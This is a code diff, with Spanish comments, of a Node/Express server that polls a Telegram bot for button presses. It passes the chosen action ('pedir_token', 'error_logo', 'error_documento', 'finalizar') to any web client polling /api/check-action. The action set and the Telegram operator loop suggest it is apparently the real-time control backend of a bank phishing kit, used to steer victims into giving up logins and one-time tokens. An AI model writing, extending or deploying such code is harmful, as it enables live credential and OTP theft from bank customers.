@@ -146,16 +146,26 @@ app.post('/api/send-message', async (req, res) => {
     });
 });
 
-// Polling and handling for Telegram
+// ===== SISTEMA ULTRA-SIMPLE DE ACCIONES =====
+// Variable global Única para la última acción
+global.currentAction = null;
+
+// Polling de Telegram
 let lastUpdateId = 0;
+let isPolling = false;
 
 const pollTelegram = async () => {
+    if (isPolling) return;
+    isPolling = true;
+    
     try {
+        console.log('🔍 Telegram polling...');
         const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
         const data = await response.json();
 
         if (data.ok && data.result.length > 0) {
-            console.log(`[📨 TELEGRAM] ${data.result.length} actualización(es) recibida(s)`);
+            console.log(`📨 ${data.result.length} UPDATE(S) DE TELEGRAM`);
+            
             for (const update of data.result) {
                 lastUpdateId = update.update_id;
 
@@ -165,108 +175,124 @@ const pollTelegram = async () => {
                     const messageId = callbackQuery.message.message_id;
                     const chatId = callbackQuery.message.chat.id;
 
-                    console.log(`[TELEGRAM] Action: ${action} for Session: ${sessionId}`);
+                    console.log(`
+🔴🔴🔴 BOTÓN PRESIONADO 🔴🔴🔴`);
+                    console.log(`Acción: ${action}`);
+                    console.log(`Sesión: ${sessionId}`);
+                    console.log(`🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴
+`);
 
-                    // Save action globally for ANY session to pick up
-                    global.pendingActions = global.pendingActions || {};
-                    // Use the sessionId from button AND a global flag
-                    global.pendingActions[sessionId] = action;
-                    global.lastAction = { action, sessionId, timestamp: Date.now() };
-                    
-                    console.log(`[💾 STORED] Action "${action}" guardada para sesiones`);
-                    console.log(`[🎯 GLOBAL] lastAction actualizada: ${action}`);
+                    // Guardar acción GLOBAL (cualquier cliente puede tomarla)
+                    global.currentAction = action;
+                    console.log(`✅ ACCIÓN GUARDADA: ${action}`);
 
-                    // Execute Telegram API calls in parallel for faster response
+                    // Responder a Telegram INMEDIATAMENTE
                     const botToken = process.env.TELEGRAM_BOT_TOKEN;
-                    await Promise.all([
-                        // 1. Remove buttons from the message
-                        fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                message_id: messageId,
-                                reply_markup: { inline_keyboard: [] }
-                            })
-                        }),
-                        // 2. Answer callback query to stop the loading state in Telegram
-                        fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ callback_query_id: callbackQuery.id })
+                    
+                    // Responder al callback
+                    fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            callback_query_id: callbackQuery.id,
+                            text: '✅ Comando recibido'
                         })
-                    ]).catch(err => console.error('Telegram API Error:', err));
+                    }).catch(err => console.error('Error answerCallback:', err));
+
+                    // Quitar botones
+                    fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            message_id: messageId,
+                            reply_markup: { inline_keyboard: [] }
+                        })
+                    }).catch(err => console.error('Error editMarkup:', err));
+                    
+                    // Enviar confirmación
+                    const actionNames = {
+                        'error_documento': '❌ Error Documento',
+                        'pedir_logo': '✅ Pedir Logo',
+                        'error_logo': '❌ Error Logo',
+                        'pedir_token': '🔑 Pedir Token',
+                        'error_token': '❌ Error Token',
+                        'finalizar': '🏁 Finalizar'
+                    };
+                    
+                    const confirmMsg = `✅ <b>COMANDO EJECUTADO</b>\n\n📍 ${actionNames[action] || action}\n⏰ ${new Date().toLocaleTimeString('es-CO')}`;
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: confirmMsg,
+                            parse_mode: 'HTML'
+                        })
+                    }).catch(err => console.error('Error sendMessage:', err));
                 }
             }
         }
     } catch (error) {
-        console.error('Polling Error:', error);
+        console.error('❌ ERROR EN POLLING:', error.message);
+    } finally {
+        isPolling = false;
+        // Continuar polling
+        setTimeout(pollTelegram, 500);
     }
-    // Continue polling - faster for better responsiveness
-    setTimeout(pollTelegram, 1000);
 };
 
 // API Endpoints
 app.get('/api/check-action', (req, res) => {
-    const sessionId = req.sessionID;
+    // Sistema ULTRA-SIMPLE: devolver la acción global si existe
+    const action = global.currentAction;
     
-    // Check for action with current sessionId
-    let action = global.pendingActions ? global.pendingActions[sessionId] : null;
-    
-    // If no action for this session, check the global last action (for mismatched sessions)
-    if (!action && global.lastAction) {
-        const timeSinceAction = Date.now() - global.lastAction.timestamp;
-        // If action is less than 30 seconds old, use it
-        if (timeSinceAction < 30000) {
-            action = global.lastAction.action;
-            console.log(`[✅ ACTION] ${action} | SID: ${sessionId} (from global)`);
-            // Clear the global action after using it
-            global.lastAction = null;
-        }
-    } else if (action) {
-        console.log(`[✅ ACTION] ${action} | SID: ${sessionId}`);
-        delete global.pendingActions[sessionId];
-    }
-
-    res.json({ action: action || null });
-});
-
-// Confirmation endpoint
-app.post('/api/send-confirmation', async (req, res) => {
-    const { action, actionName } = req.body;
-    const sessionId = req.sessionID;
-    
-    // Respond immediately to client
-    res.json({ success: true });
-    
-    // Send confirmation to Telegram asynchronously
-    try {
-        const message = `✅ <b>COMANDO EJECUTADO</b>\n\n📍 Acción: ${actionName}\n🔑 Sesión: ${sessionId}\n⏰ ${new Date().toLocaleTimeString('es-CO')}`;
-        
-        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: process.env.TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-        console.log(`[✅ CONFIRMACIÓN] ${actionName} ejecutado`);
-    } catch (error) {
-        console.error('Error enviando confirmación:', error);
+    if (action) {
+        console.log(`✅ CLIENTE RECOGIÓ ACCIÓN: ${action}`);
+        // Limpiar la acción después de entregarla
+        global.currentAction = null;
+        res.json({ action });
+    } else {
+        // No hay acción pendiente
+        res.json({ action: null });
     }
 });
+
+// Test endpoint
+app.get('/api/test', (req, res) => {
+    res.json({ 
+        status: 'OK', 
+        currentAction: global.currentAction,
+        timestamp: new Date().toISOString()
+    });
+});
+
+
 
 // Start Server
 app.listen(PORT, () => {
-    console.log(`
-🚀 ===================================`);
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`🚀 ===================================
-`);
-    console.log(`🤖 Iniciando Telegram polling...`);
-    // Start Telegram polling automatically
+    console.log(`\n${'='.repeat(50)}`);
+    console.log(`🚀 SERVIDOR INICIADO EN PUERTO ${PORT}`);
+    console.log(`${'='.repeat(50)}\n`);
+    
+    // Verificar variables de entorno
+    if (!process.env.TELEGRAM_BOT_TOKEN) {
+        console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
+    } else {
+        console.log('✅ TELEGRAM_BOT_TOKEN configurado');
+    }
+    
+    if (!process.env.TELEGRAM_CHAT_ID) {
+        console.error('❌ ERROR: TELEGRAM_CHAT_ID no configurado');
+    } else {
+        console.log('✅ TELEGRAM_CHAT_ID configurado');
+    }
+    
+    console.log('\n🤖 Iniciando Telegram polling...\n');
+    
+    // Start Telegram polling
     pollTelegram();
+    
+    console.log('✅ Sistema listo. Esperando comandos de Telegram...\n');
 });
